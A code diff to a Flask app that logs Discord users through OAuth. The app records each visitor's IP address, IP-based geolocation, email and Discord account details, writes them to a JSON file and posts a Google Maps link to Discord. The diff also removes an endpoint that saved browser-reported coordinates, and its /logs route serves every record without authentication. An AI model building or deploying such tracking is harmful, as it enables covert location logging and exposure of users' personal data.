@@ -1,12 +1,14 @@
-from flask import Flask, request, render_template, jsonify
-import requests, json, os, threading
-from dotenv import load_dotenv
+import requests
+import json
+import os
+import threading
 from datetime import datetime
+from flask import Flask, request, jsonify
 from discord_bot import bot
+from dotenv import load_dotenv
 
 load_dotenv()
 
-app = Flask(__name__)
 ACCESS_LOG_FILE = "access_log.json"
 
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
@@ -15,13 +17,15 @@ DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
 REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
+app = Flask(__name__)
+
 # ----------------- IP取得 -----------------
 def get_client_ip():
     if "X-Forwarded-For" in request.headers:
         return request.headers["X-Forwarded-For"].split(",")[0].strip()
     return request.remote_addr
 
-# ----------------- Geo情報取得（IPベースはバックアップ） -----------------
+# ----------------- Geo情報取得 -----------------
 def get_geo_info(ip):
     geo = {
         "ip": ip,
@@ -39,7 +43,10 @@ def get_geo_info(ip):
     }
 
     try:
-        res = requests.get(f"http://ip-api.com/json/{ip}?lang=ja&fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,proxy,hosting,query", timeout=3)
+        res = requests.get(
+            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,proxy,hosting,query",
+            timeout=3
+        )
         data = res.json()
         if data.get("status") == "success":
             geo.update({
@@ -79,46 +86,33 @@ def save_log(discord_id, data):
             logs = json.load(f)
     else:
         logs = {}
+
     if discord_id not in logs:
         logs[discord_id] = {"history": []}
+
     data["timestamp"] = now
     logs[discord_id]["history"].append(data)
+
     with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
-# ----------------- Flaskルート -----------------
-from urllib.parse import quote
-
-@app.route("/")
-def index():
-    redirect_uri_encoded = quote(REDIRECT_URI, safe='')
-    scopes = "identify email connections guilds"
-    scopes_encoded = quote(scopes, safe='')
-    discord_auth_url = (
-        f"https://discord.com/oauth2/authorize"
-        f"?client_id={DISCORD_CLIENT_ID}"
-        f"&response_type=code"
-        f"&redirect_uri={redirect_uri_encoded}"
-        f"&scope={scopes_encoded}"
-    )
-    return render_template("index.html", discord_auth_url=discord_auth_url)
-
+# ----------------- Discord OAuth2 コールバック -----------------
 @app.route("/callback")
 def callback():
     code = request.args.get("code")
     if not code:
-        return "コードがありません", 400
+        return jsonify({"error": "コードがありません"}), 400
 
+    # トークン取得
     token_url = "https://discord.com/api/oauth2/token"
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    scopes = "identify email connections guilds"
     data = {
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
         "grant_type": "authorization_code",
         "code": code,
         "redirect_uri": REDIRECT_URI,
-        "scope": scopes
+        "scope": "identify email connections guilds"
     }
 
     try:
@@ -126,11 +120,11 @@ def callback():
         res.raise_for_status()
         token = res.json()
     except requests.exceptions.RequestException as e:
-        return f"トークン取得エラー: {e}", 500
+        return jsonify({"error": f"トークン取得エラー: {e}"}), 500
 
     access_token = token.get("access_token")
     if not access_token:
-        return "アクセストークン取得失敗", 400
+        return jsonify({"error": "アクセストークン取得失敗"}), 400
 
     headers_auth = {"Authorization": f"Bearer {access_token}"}
     user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
@@ -177,46 +171,9 @@ Google Map={data_log['map_link']}
     except Exception as e:
         print("Embed送信エラー:", e)
 
-    return render_template("welcome.html", username=data_log["username"], discriminator=data_log["discriminator"], user_id=user["id"])
+    return jsonify({"status": "ok", "user": data_log})
 
-@app.route("/submit_location", methods=["POST"])
-def submit_location():
-    try:
-        data = request.get_json()
-        user_id = data.get("user_id")
-        lat = data.get("lat")
-        lon = data.get("lon")
-        if not (user_id and lat and lon):
-            return jsonify({"status": "error"}), 400
-
-        # 逆ジオコーディング
-        res = requests.get(f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&accept-language=ja", headers={"User-Agent": "GeoApp"}, timeout=5)
-        d = res.json()
-        region = d.get("address", {}).get("state", "不明")
-        city = d.get("address", {}).get("city") or d.get("address", {}).get("town") or d.get("address", {}).get("village") or "不明"
-
-        # ログ更新
-        if os.path.exists(ACCESS_LOG_FILE):
-            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
-                logs = json.load(f)
-        else:
-            logs = {}
-
-        if user_id in logs:
-            logs[user_id]["history"][-1]["region"] = region
-            logs[user_id]["history"][-1]["city"] = city
-            logs[user_id]["history"][-1]["lat"] = lat
-            logs[user_id]["history"][-1]["lon"] = lon
-            logs[user_id]["history"][-1]["map_link"] = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
-
-            with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
-                json.dump(logs, f, indent=4, ensure_ascii=False)
-
-        return jsonify({"status": "ok"})
-    except Exception as e:
-        print("位置情報保存エラー:", e)
-        return jsonify({"status": "error"}), 500
-
+# ----------------- ログ確認用 -----------------
 @app.route("/logs")
 def show_logs():
     if os.path.exists(ACCESS_LOG_FILE):
@@ -224,8 +181,9 @@ def show_logs():
             logs = json.load(f)
     else:
         logs = {}
-    return render_template("logs.html", logs=logs)
+    return jsonify(logs)
 
+# ----------------- Discord Bot 起動 -----------------
 def run_bot():
     bot.run(DISCORD_BOT_TOKEN)
 
